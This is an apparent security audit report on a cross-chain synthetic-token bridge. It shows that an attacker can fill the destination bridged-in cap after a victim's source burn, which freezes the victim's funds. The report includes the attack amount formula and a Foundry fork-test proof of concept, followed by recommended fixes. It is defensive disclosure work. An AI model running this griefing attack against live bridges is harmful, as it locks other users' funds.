### Title
Cross-chain deposits can be invalidated by filling the destination bridge cap after source burn - ([File: contracts/SyntheticToken.sol](contracts/SyntheticToken.sol))

### Summary
`ProxyOFT.sendFrom()` burns a user's synthetic tokens on the source chain before the destination message is processed. When LayerZero later delivers the packet, the destination mints through `ProxyOFT._creditTo()`, which calls `SyntheticToken.mint()` and enforces the **current** `maxBridgedInSupply`. Because delivery is asynchronous, another user can bridge enough of the same synthetic token to consume the remaining cap between the victim's source burn and destination delivery. The destination mint then reverts with `SurpassMaxBridgingSupply`, leaving the source tokens burned while the destination credit is only stored as a retryable failed message.

### Finding Description
The outbound path debits the user before sending the LayerZero message:

1. `ProxyOFT.sendFrom()` calls `_send()` with the encoded recipient and amount.
2. `OFTCoreUpgradeable._send()` invokes `_debitFrom()`.
3. `ProxyOFT._debitFrom()` verifies the caller and route, then burns `amount_` from the source-chain account. [1](#0-0) 
4. `_send()` emits the resulting amount in a `PT_SEND` LayerZero payload. [2](#0-1) 

On the destination chain, `_sendAck()` decodes the message and calls `_creditTo()`; `ProxyOFT._creditTo()` calls `syntheticToken.mint()`. [3](#0-2) [4](#0-3) 

The mint is evaluated under destination state at processing time. For calls from the configured `proxyOFT`, `_mint()` increments `totalBridgedIn` and reverts if the resulting net bridged-in amount exceeds `maxBridgedInSupply`. [5](#0-4) 

When that assertion fails, `NonblockingLzAppUpgradeable._blockingLzReceive()` catches the revert and stores only the payload hash in `failedMessages`; the source-chain burn is not rolled back. [6](#0-5) 
Anyone can later invoke `retryMessage()` with the same payload, but the stored message is deleted before execution and the retry reverts again while the cap remains filled. [7](#0-6) 

### Impact Explanation
A user can lose access to bridged funds even though their source-chain transfer was valid when submitted. The source `SyntheticToken` balance is burned, while the destination mint fails solely because the mutable bridged-in supply crossed `maxBridgedInSupply` before processing.

An unprivileged attacker can deliberately consume the remaining destination cap by bridging their own tokens ahead of the victim's in-flight packet. This temporarily freezes the victim's bridged amount. The attacker can also preserve the occupied `totalBridgedIn` after receiving their tokens: burning through a normal pool operation such as `Pool.swap()` does not decrement `totalBridgedIn`, because only a burn initiated by `proxyOFT` updates `totalBridgedOut`. [8](#0-7) [9](#0-8) 

This is analogous to validating an immutable user authorization against a later mutable context: the source operation was accepted and made irreversible, while acceptance on the destination depends on state that can change before processing.

### Likelihood Explanation
Medium.

- `sendFrom()` is public, and an attacker needs only a source-chain synthetic-token balance to consume destination bridge capacity.
- Cross-chain delivery is asynchronous, creating a natural window in which the destination `bridgedInSupply()` can change.
- An attacker observing a pending LayerZero packet can bridge `maxBridgedInSupply - bridgedInSupply - victimAmount + epsilon` first, causing the victim's mint to cross the cap.
- No governor, oracle operator, malicious endpoint, or forged message is needed: the source packet remains authentic.
- Recovery is possible only after net bridged-in supply falls enough, or the cap is raised; while the cap remains saturated, every `retryMessage()` attempt reverts.

### Recommendation
Do not make completion of an already-debited bridge message depend on unconstrained mutable destination availability. Prefer one of the following:

- Reserve destination bridge capacity when the source debit is initiated, using a coordinated reservation or allowance mechanism.
- Credit a separate pending/claimable balance that cannot be retroactively invalidated by later cap consumption.
- Track in-flight inbound amounts and evaluate whether the message was within the configured cap at source acceptance, then guarantee its destination credit.
- If cap enforcement at delivery is retained, expose a first-class `claimFailedMessage()` path and document that retries can be griefed by cap consumption.

Any fix should preserve the intended global `maxBridgedInSupply` invariant while ensuring that a packet whose source debit already succeeded cannot be indefinitely held hostage by later public bridge activity.

### Proof of Concept
The following Foundry-style fork test demonstrates the issue. The LayerZero endpoint call is used only to model delivery of an authentic packet whose source-chain debit succeeded; the attacker does not require endpoint privileges.

```solidity
// test/foundry/poc/BridgeCapInvalidatesPendingDeposit.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {ProxyOFT} from "contracts/ProxyOFT.sol";
import {SyntheticToken} from "contracts/SyntheticToken.sol";

contract BridgeCapInvalidatesPendingDeposit is Test {
    uint16 constant PT_SEND = 0;

    function test_inboundMessageInvalidAfterCapIsFilled() external {
        // Destination fork fixtures.
        ProxyOFT proxyOFT = ProxyOFT(DEPLOYED_PROXY_OFT);
        SyntheticToken synthetic = SyntheticToken(proxyOFT.token());
        address endpoint = address(proxyOFT.lzEndpoint());
        uint16 srcChainId = REMOTE_LZ_CHAIN_ID;
        bytes memory srcAddress = proxyOFT.trustedRemoteLookup(srcChainId);

        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        uint256 victimAmount = 100e18;

        // Remaining headroom chosen so the victim's packet exceeds the cap.
        uint256 attackerAmount =
            synthetic.maxBridgedInSupply()
                - synthetic.bridgedInSupply()
                - victimAmount
                + 1;

        // On the source fork, attacker and victim each call:
        // proxyOFT.sendFrom(account, DST_CHAIN_ID, account, amount).
        // Both calls burn their source-chain synthetic tokens. Reproduce the
        // corresponding authentic destination packets below.
        bytes memory attackerPayload = abi.encode(
            PT_SEND,
            abi.encodePacked(attacker),
            attackerAmount
        );
        bytes memory victimPayload = abi.encode(
            PT_SEND,
            abi.encodePacked(victim),
            victimAmount
        );

        // Deliver the attacker's earlier packet first.
        vm.prank(endpoint);
        proxyOFT.lzReceive(srcChainId, srcAddress, 1, attackerPayload);
        assertEq(synthetic.balanceOf(attacker), attackerAmount);

        // Deliver the victim's packet. The source debit already occurred, but
        // destination minting now exceeds the active bridged-in cap.
        vm.prank(endpoint);
        proxyOFT.lzReceive(srcChainId, srcAddress, 2, victimPayload);

        // The failed payload is stored and no funds are minted to the victim.
        assertEq(synthetic.balanceOf(victim), 0);
        assertTrue(
            proxyOFT.failedMessages(srcChainId, srcAddress, 2) != bytes32(0)
        );

        // A public retry with the authentic packet still reverts while the
        // attacker keeps net bridged-in supply at the cap.
        vm.expectRevert(SyntheticToken.SurpassMaxBridgingSupply.selector);
        proxyOFT.retryMessage(srcChainId, srcAddress, 2, victimPayload);

        assertEq(synthetic.balanceOf(victim), 0);
    }
}
```

The invariant violated is asynchronous bridge completion: after the source debit succeeds, an otherwise authentic destination credit can be invalidated by public activity that changes `bridgedInSupply()` before delivery or retry.

### Citations

**File:** contracts/ProxyOFT.sol (L70-82)
```text
    function _debitFrom(
        address from_,
        uint16 dstChainId_,
        bytes memory /*toAddress_*/,
        uint amount_
    ) internal override returns (uint256 _sent) {
        IPoolRegistry _poolRegistry = syntheticToken.poolRegistry();
        if (_msgSender() != from_) revert SenderIsNotTheOwner();
        if (!_poolRegistry.isBridgingActive()) revert BridgingIsPaused();
        if (!_poolRegistry.isDestinationChainSupported(dstChainId_)) revert DestinationChainNotAllowed();

        syntheticToken.burn(from_, amount_);
        return amount_;
```

**File:** contracts/ProxyOFT.sol (L85-93)
```text
    /// @inheritdoc OFTCoreUpgradeable
    function _creditTo(
        uint16 /*srcChainId_*/,
        address toAddress_,
        uint amount_
    ) internal override returns (uint256 _received) {
        syntheticToken.mint(toAddress_, amount_);
        return amount_;
    }
```

**File:** contracts/dependencies/@layerzerolabs/solidity-examples/contracts-upgradeable/token/oft/OFTCoreUpgradeable.sol (L84-100)
```text
    function _send(
        address _from,
        uint16 _dstChainId,
        bytes memory _toAddress,
        uint _amount,
        address payable _refundAddress,
        address _zroPaymentAddress,
        bytes memory _adapterParams
    ) internal virtual {
        _checkAdapterParams(_dstChainId, PT_SEND, _adapterParams, NO_EXTRA_GAS);

        uint amount = _debitFrom(_from, _dstChainId, _toAddress, _amount);

        bytes memory lzPayload = abi.encode(PT_SEND, _toAddress, amount);
        _lzSend(_dstChainId, lzPayload, _refundAddress, _zroPaymentAddress, _adapterParams, msg.value);

        emit SendToChain(_dstChainId, _from, _toAddress, amount);
```

**File:** contracts/dependencies/@layerzerolabs/solidity-examples/contracts-upgradeable/token/oft/OFTCoreUpgradeable.sol (L103-109)
```text
    function _sendAck(uint16 _srcChainId, bytes memory, uint64, bytes memory _payload) internal virtual {
        (, bytes memory toAddressBytes, uint amount) = abi.decode(_payload, (uint16, bytes, uint));

        address to = toAddressBytes.toAddress(0);

        amount = _creditTo(_srcChainId, to, amount);
        emit ReceiveFromChain(_srcChainId, to, amount);
```

**File:** contracts/SyntheticToken.sol (L270-291)
```text
    function _burn(address account_, uint256 amount_) private {
        if (account_ == address(0)) revert BurnFromTheZeroAddress();

        address _msgSender = _msgSender();

        if (_isMsgSenderProxyOFT(_msgSender)) {
            totalBridgedOut += amount_;
            if (bridgedOutSupply() > maxBridgedOutSupply) revert SurpassMaxBridgingSupply();
        } else if (_isMsgSenderAmo(_msgSender)) {
            // AMO can only burn from self address.
            // account_ should be AMO and in this case it is same as _msgSender()
            if (account_ != _msgSender) revert AmoInvalidAccount();

            amoSupply -= amount_;
        }

        uint256 _currentBalance = balanceOf[account_];
        if (_currentBalance < amount_) revert BurnAmountExceedsBalance();
        unchecked {
            balanceOf[account_] = _currentBalance - amount_;
            totalSupply -= amount_;
        }
```

**File:** contracts/SyntheticToken.sol (L333-347)
```text
    function _mint(address account_, uint256 amount_) private onlyIfSyntheticTokenIsActive {
        if (account_ == address(0)) revert MintToTheZeroAddress();

        address _msgSender = _msgSender();

        if (_isMsgSenderProxyOFT(_msgSender)) {
            totalBridgedIn += amount_;
            if (bridgedInSupply() > maxBridgedInSupply) revert SurpassMaxBridgingSupply();
        } else if (_isMsgSenderAmo(_msgSender)) {
            amoSupply += amount_;
            if (amoSupply > maxAmoSupply) revert SurpassMaxAmoSupply();
        }

        totalSupply += amount_;
        if (totalSupply > maxTotalSupply) revert SurpassMaxSynthSupply();
```

**File:** contracts/dependencies/@layerzerolabs/solidity-examples/contracts-upgradeable/lzApp/NonblockingLzAppUpgradeable.sol (L29-39)
```text
    function _blockingLzReceive(uint16 _srcChainId, bytes memory _srcAddress, uint64 _nonce, bytes memory _payload) internal virtual override {
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft(), 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));
        // try-catch all errors/exceptions
        if (!success) {
            _storeFailedMessage(_srcChainId, _srcAddress, _nonce, _payload, reason);
        }
    }

    function _storeFailedMessage(uint16 _srcChainId, bytes memory _srcAddress, uint64 _nonce, bytes memory _payload, bytes memory _reason) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
```

**File:** contracts/dependencies/@layerzerolabs/solidity-examples/contracts-upgradeable/lzApp/NonblockingLzAppUpgradeable.sol (L51-59)
```text
    function retryMessage(uint16 _srcChainId, bytes calldata _srcAddress, uint64 _nonce, bytes calldata _payload) public payable virtual {
        // assert there is message to retry
        bytes32 payloadHash = failedMessages[_srcChainId][_srcAddress][_nonce];
        require(payloadHash != bytes32(0), "NonblockingLzApp: no stored message");
        require(keccak256(_payload) == payloadHash, "NonblockingLzApp: invalid payload");
        // clear the stored message
        failedMessages[_srcChainId][_srcAddress][_nonce] = bytes32(0);
        // execute the message. revert if it fails again
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
```

**File:** contracts/Pool.sol (L642-668)
```text
    function swap(
        ISyntheticToken syntheticTokenIn_,
        ISyntheticToken syntheticTokenOut_,
        uint256 amountIn_
    )
        external
        override
        whenNotShutdown
        nonReentrant
        onlyIfSyntheticTokenExists(syntheticTokenIn_)
        onlyIfSyntheticTokenExists(syntheticTokenOut_)
        returns (uint256 _amountOut, uint256 _fee)
    {
        address _msgSender = _msgSender();

        if (!isSwapActive) revert SwapFeatureIsInactive();
        if (amountIn_ == 0 || amountIn_ > syntheticTokenIn_.balanceOf(_msgSender)) revert AmountInIsInvalid();

        syntheticTokenIn_.burn(_msgSender, amountIn_);

        (_amountOut, _fee) = quoteSwapOut(syntheticTokenIn_, syntheticTokenOut_, amountIn_);

        if (_fee > 0) {
            syntheticTokenOut_.mint(_poolRegistry.feeCollector(), _fee);
        }

        syntheticTokenOut_.mint(_msgSender, _amountOut);
```
